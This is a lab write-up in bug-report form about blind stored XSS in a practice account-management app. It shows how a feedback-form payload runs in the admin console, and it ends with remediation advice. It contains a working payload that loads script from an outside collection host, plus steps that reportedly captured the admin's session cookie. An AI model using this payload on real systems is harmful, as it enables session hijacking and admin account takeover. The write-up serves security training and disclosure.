Lab name : Blind XSS - ClientFlow Simple account management
# Title
Blind Cross-Site Scripting (XSS) via Feedback Submission Leading to Admin Session Compromise

# Vulnerability Type
Blind Cross-Site Scripting (XSS) / Stored XSS

# Summary
The application is vulnerable to Blind Cross-Site Scripting (XSS) through the public "Share feedback" form. The application fails to properly sanitize or encode user-supplied input before storing it in the database. When an administrator logs into the backend console and views the submitted feedback (`/admin/feedback.php?id=1`), the malicious JavaScript payload executes automatically in the administrator's browser context. This allows an attacker to execute arbitrary code within the privileged administrator session.

# Vulnerable Endpoint
- `https://clientflow.pwnedbox.site/feedback.php` (Injection Point)
- `https://clientflow.pwnedbox.site/admin/feedback.php?id=1` (Execution Point)

# Vulnerable Parameter
Based on the DOM analysis, the following parameters are vulnerable and reflect the payload unsanitized in the admin console:
- `Name` (Reflected in the "Sender" field)
- `Your feedback` (Reflected in the "Message" section)

# Steps to Reproduce
1. Navigate to the feedback submission form: `https://clientflow.pwnedbox.site/feedback.php`
2. In the **"Name"** and **"Your feedback"** fields, insert the following payload:  
    `"><img/src/onerror=import('//xss.report/c/cyberbro')>`
3. Fill in the remaining required fields (Email, What can we help with?) with valid data and click **"Send feedback"**.
4. Wait for the administrator to log in and view the submitted feedback in the admin console.
5. Observe the out-of-band interaction on `xss.report`. The tool successfully captures the execution, recording the admin's `PHPSESSID` cookie, the URI (`/admin/feedback.php?id=1`), and the Referrer (`/admin/dashboard.php`), confirming the payload executed in the admin's browser.

# Payload Used 
`"><img/src/onerror=import('//xss.report/c/cyberbro')>`

# Proof of Concept
<img width="1920" height="1037" alt="1" src="https://github.com/user-attachments/assets/6fda5b1c-9946-4963-9ab9-21aad3e9fa70" />
<img width="1920" height="1040" alt="2" src="https://github.com/user-attachments/assets/03a6a17f-f3fc-4de0-a9a4-88414d5925aa" />
<img width="1920" height="1041" alt="3" src="https://github.com/user-attachments/assets/bb7c08af-f687-46d6-af6c-e1a64935c156" />
<img width="1920" height="1036" alt="4" src="https://github.com/user-attachments/assets/3ca4493d-ac57-4b43-be6c-aeabbc3a258c" />


# Extracted DOM
```js
<html>
<head>
    <meta charset="utf-8">
    <title>Feedback #1</title>
</head>
<body>
    <!-- ... header ... -->
    <main class="dashboard-wrap">
        <div class="page-title">
            <span class="eyebrow">SUBMISSION #1</span>
            <h1>General feedback</h1>
        </div>
        <section class="panel detail">
            <div class="detail-grid">
                <div>
                    <span>Sender</span>
                    <!-- REFLECTION 1: Name -->
                    <strong>'"&gt;<img src="" onerror="import('//xss.report/c/cyberbro')"></strong>
                </div>
                <div><span>Email</span><strong>hello@gmail.com</strong></div>
                <div><span>Submitted</span><strong>2026-10-22 06:13:05</strong></div>
                <div><span>Status</span><strong>new</strong></div>
            </div>
            <h3>Message</h3>
            <div class="safe-output">
                <!-- REFLECTION 2: Your feedback -->
                '"&gt;<img src="" onerror="import('//xss.report/c/cyberbro')">
            </div>
            <!-- ... form ... -->
        </section>
    </main>
    <!-- ... scripts ... -->
</body>
</html>
```

# Impact
Because this is a Blind XSS, the payload executes in the browser of an internal user (specifically, the site administrator) when they view the infected inquiries. This is a critical vulnerability. An attacker can perform the following actions:

- **Session Hijacking & Admin Account Takeover:** Steal the administrator's session cookie (`PHPSESSID`), allowing the attacker to completely bypass authentication and take over the admin account.
- **Privileged Actions:** The script can make authenticated requests on behalf of the administrator to perform sensitive actions, such as altering site content, viewing sensitive customer data, or creating new admin users.
- **Exfiltration of Sensitive Data:** The payload can read the contents of the admin dashboard or internal pages and send them to an attacker-controlled server.

# Recommendation for fix
1. **Output Encoding:** Apply context-aware HTML entity encoding to **all** user-supplied data before rendering it in **any** interface, including backend administrative panels (e.g., convert `<` to `&lt;`, `>` to `&gt;`, `"` to `&quot;`). The backend must be treated with the same security rigor as the public-facing frontend.
2. **Input Sanitization:** Use a reputable HTML sanitization library (such as DOMPurify) to strip dangerous tags and attributes from user input before storing it in the database. If rich text is not required, strip all HTML tags entirely.
3. **Content Security Policy (CSP):** Deploy a strict CSP header on the administrative backend to prevent the execution of inline scripts and unauthorized external scripts as a defense-in-depth measure.
4. **Secure Cookies:** Ensure all session cookies (like `PHPSESSID`) use the `HttpOnly` and `Secure` flags to prevent JavaScript from accessing them, mitigating the risk of session hijacking even if an XSS occurs.

